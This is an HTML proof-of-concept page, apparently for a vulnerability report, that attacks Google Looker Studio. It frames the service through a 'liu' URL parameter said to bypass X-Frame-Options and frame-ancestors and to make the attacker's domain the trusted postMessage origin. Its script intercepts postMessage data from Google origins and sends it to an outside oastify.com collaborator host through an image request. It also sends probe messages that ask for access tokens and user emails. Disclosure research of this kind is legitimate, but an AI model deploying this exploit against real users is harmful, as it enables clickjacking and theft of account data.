<!DOCTYPE html>
<html>

<head>
    <title>Looker Studio - Framing Bypass + PostMessage Data Leak PoC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            padding: 20px;
        }

        .header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid #30363d;
            margin-bottom: 20px;
        }

        .header h1 {
            color: #f85149;
            font-size: 22px;
        }

        .header p {
            color: #8b949e;
            margin-top: 8px;
            font-size: 14px;
        }

        .grid {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .panel {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
            flex: 1;
            min-width: 400px;
        }

        .panel h2 {
            font-size: 14px;
            color: #58a6ff;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
        }

        .badge-success {
            background: #238636;
            color: #fff;
        }

        .badge-danger {
            background: #da3633;
            color: #fff;
        }

        .badge-warn {
            background: #d29922;
            color: #fff;
        }

        .badge-info {
            background: #1f6feb;
            color: #fff;
        }

        #targetFrame {
            width: 100%;
            height: 350px;
            border: 2px solid #f85149;
            border-radius: 4px;
            background: #0d1117;
        }

        .log-area {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 12px;
            max-height: 350px;
            overflow-y: auto;
            line-height: 1.6;
        }

        .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid #21262d;
        }

        .log-time {
            color: #484f58;
        }

        .log-success {
            color: #3fb950;
        }

        .log-error {
            color: #f85149;
        }

        .log-info {
            color: #58a6ff;
        }

        .log-warn {
            color: #d29922;
        }

        .log-critical {
            color: #f85149;
            font-weight: bold;
            background: #3d1117;
            padding: 4px;
            border-radius: 3px;
        }

        .findings {
            margin-top: 20px;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
        }

        .findings h2 {
            color: #f85149;
            font-size: 16px;
            margin-bottom: 12px;
        }

        .finding-item {
            padding: 8px 12px;
            margin: 6px 0;
            border-radius: 4px;
            font-size: 13px;
        }

        .finding-confirmed {
            background: #0d2818;
            border-left: 3px solid #3fb950;
        }

        .finding-pending {
            background: #2a1f00;
            border-left: 3px solid #d29922;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }

        td,
        th {
            padding: 6px 10px;
            text-align: left;
            border-bottom: 1px solid #21262d;
            font-size: 12px;
        }

        th {
            color: #8b949e;
        }
    </style>
</head>

<body>
    <div class="header">
        <h1>Google Looker Studio &mdash; Framing Bypass + PostMessage Data Leak</h1>
        <p>The <code>liu</code> URL parameter on <code>/appview</code> removes X-Frame-Options and frame-ancestors CSP,
            AND sets the trusted postMessage origin to the attacker's domain.</p>
    </div>

    <div class="grid">
        <div class="panel">
            <h2>Victim's Looker Studio (framed by attacker)</h2>
            <p style="margin-bottom:8px;font-size:12px;color:#8b949e;">
                URL: <code id="frameUrl">loading...</code>
            </p>
            <iframe id="targetFrame" src="about:blank"></iframe>
        </div>

        <div class="panel">
            <h2>Exploit Log</h2>
            <div id="log" class="log-area"></div>
        </div>
    </div>

    <div class="findings">
        <h2>Findings</h2>
        <div id="findingsArea"></div>
        <table>
            <tr>
                <th>Property</th>
                <th>Value</th>
            </tr>
            <tr>
                <td>Target</td>
                <td><code>lookerstudio.google.com</code></td>
            </tr>
            <tr>
                <td>Attacker Origin</td>
                <td><code id="attackerOriginCell">-</code></td>
            </tr>
            <tr>
                <td>Vulnerability</td>
                <td>Framing Bypass + PostMessage Origin Trust Override</td>
            </tr>
            <tr>
                <td>Root Cause</td>
                <td><code>liu</code> parameter removes X-Frame-Options, frame-ancestors, and sets internal
                    <code>Po</code> (trusted origin) to attacker domain</td>
            </tr>
            <tr>
                <td>Impact</td>
                <td>Clickjacking, Cross-origin data interception, Potential account compromise</td>
            </tr>
        </table>
    </div>

    <script>
        // === CONFIGURATION ===
        var ATTACKER_ORIGIN = window.location.origin; // auto-detect
        var LOOKER_URL = 'https://lookerstudio.google.com/u/0/appview?liu=' + encodeURIComponent(ATTACKER_ORIGIN);
        var OAST = 'https://pun2l2sx9c1apc5lntwdn6mkgbm2atyi.oastify.com';

        // === STATE ===
        var findings = [];
        var googleMessagesReceived = 0;
        var framingConfirmed = false;

        // === LOGGING ===
        function log(msg, type) {
            type = type || 'info';
            var el = document.getElementById('log');
            var time = new Date().toISOString().split('T')[1].split('.')[0];
            var div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = '<span class="log-time">[' + time + ']</span> <span class="log-' + type + '">' + msg + '</span>';
            el.appendChild(div);
            el.scrollTop = el.scrollHeight;
        }

        function addFinding(text, confirmed) {
            findings.push({ text: text, confirmed: confirmed });
            var area = document.getElementById('findingsArea');
            var div = document.createElement('div');
            div.className = 'finding-item ' + (confirmed ? 'finding-confirmed' : 'finding-pending');
            div.innerHTML = (confirmed ? '<span class="badge badge-success">CONFIRMED</span> ' : '<span class="badge badge-warn">TESTING</span> ') + text;
            area.appendChild(div);
        }

        // === STEP 1: Listen for messages from Looker Studio ===
        window.addEventListener('message', function (e) {
            var dataStr;
            if (typeof e.data === 'string') {
                dataStr = e.data.substring(0, 500);
            } else {
                try { dataStr = JSON.stringify(e.data).substring(0, 500); }
                catch (err) { dataStr = String(e.data); }
            }

            log('RECEIVED postMessage from <b>' + e.origin + '</b>: <code>' + dataStr.replace(/</g, '&lt;') + '</code>', 'success');

            // Check if it's from Google
            if (e.origin.indexOf('google.com') !== -1) {
                googleMessagesReceived++;

                log('&#9888; DATA INTERCEPTED from Google domain! Message #' + googleMessagesReceived, 'critical');

                addFinding(
                    'Cross-origin data intercepted from <code>' + e.origin + '</code>: <code>' + dataStr.replace(/</g, '&lt;').substring(0, 100) + '</code>',
                    true
                );

                // Exfiltrate to OAST collaborator
                var img = new Image();
                img.src = OAST + '/exfil?origin=' + encodeURIComponent(e.origin) + '&data=' + encodeURIComponent(dataStr) + '&attacker=' + encodeURIComponent(ATTACKER_ORIGIN);
                log('Data sent to OAST collaborator: <code>' + OAST + '</code>', 'warn');
            }

            // Check for MessagePorts (notebook channel)
            if (e.ports && e.ports.length > 0) {
                log('Got ' + e.ports.length + ' MessagePort(s) from ' + e.origin + '!', 'critical');
                addFinding('MessagePort received from <code>' + e.origin + '</code> - potential for full channel control', true);
            }
        });

        // === STEP 2: Load Looker Studio in iframe ===
        document.getElementById('frameUrl').textContent = LOOKER_URL;
        document.getElementById('attackerOriginCell').textContent = ATTACKER_ORIGIN;

        log('PoC initialized. Attacker origin: <b>' + ATTACKER_ORIGIN + '</b>', 'info');
        log('Loading Looker Studio in iframe with <code>liu=' + ATTACKER_ORIGIN + '</code>...', 'info');
        addFinding('Framing bypass: <code>liu</code> parameter removes X-Frame-Options and frame-ancestors', false);

        var frame = document.getElementById('targetFrame');
        frame.src = LOOKER_URL;

        // === STEP 3: Verify iframe loaded ===
        frame.onload = function () {
            log('Iframe onload event fired', 'info');
        };

        setTimeout(function () {
            try {
                frame.contentWindow.location.href;
                log('Unexpected: same-origin access to iframe', 'warn');
            } catch (e) {
                framingConfirmed = true;
                log('&#10004; Framing bypass CONFIRMED - Looker Studio loaded cross-origin in attacker iframe', 'success');
                addFinding('Framing bypass: Looker Studio loads inside attacker iframe (X-Frame-Options and frame-ancestors bypassed via <code>liu</code>)', true);
            }
        }, 6000);

        // === STEP 4: Send postMessage probes after iframe loads ===
        setTimeout(function () {
            log('Sending postMessage probes to Looker Studio...', 'info');

            // The exact format found in JS bundle:
            // Handler checks: c.origin === b.Po && typeof c.data === "string"
            // Then: JSON.parse(c.data) -> {type, payload}
            var probes = [
                { type: "NAVIGATE", payload: { url: "/test" } },
                { type: "ACCESS_TOKEN", payload: {} },
                { type: "GOOGLE_AUTH_USER_EMAIL", payload: {} },
                { type: "READY", payload: {} },
                { type: "INIT", payload: {} }
            ];

            for (var i = 0; i < probes.length; i++) {
                (function (probe, idx) {
                    setTimeout(function () {
                        var str = JSON.stringify(probe);
                        frame.contentWindow.postMessage(str, '*');
                        log('Sent probe: <code>' + str + '</code>', 'info');
                    }, idx * 500);
                })(probes[i], i);
            }
        }, 8000);

        // === STEP 5: Summary after probes ===
        setTimeout(function () {
            log('--- SUMMARY ---', 'info');
            log('Framing bypass: ' + (framingConfirmed ? '<b class="log-success">CONFIRMED</b>' : '<b class="log-warn">PENDING</b>'), 'info');
            log('Google messages intercepted: <b>' + googleMessagesReceived + '</b>', googleMessagesReceived > 0 ? 'success' : 'info');

            if (googleMessagesReceived > 0) {
                log('&#9888; VULNERABLE: Attacker at <b>' + ATTACKER_ORIGIN + '</b> intercepted data from <b>lookerstudio.google.com</b>', 'critical');
            }
        }, 15000);
    </script>
</body>

</html>
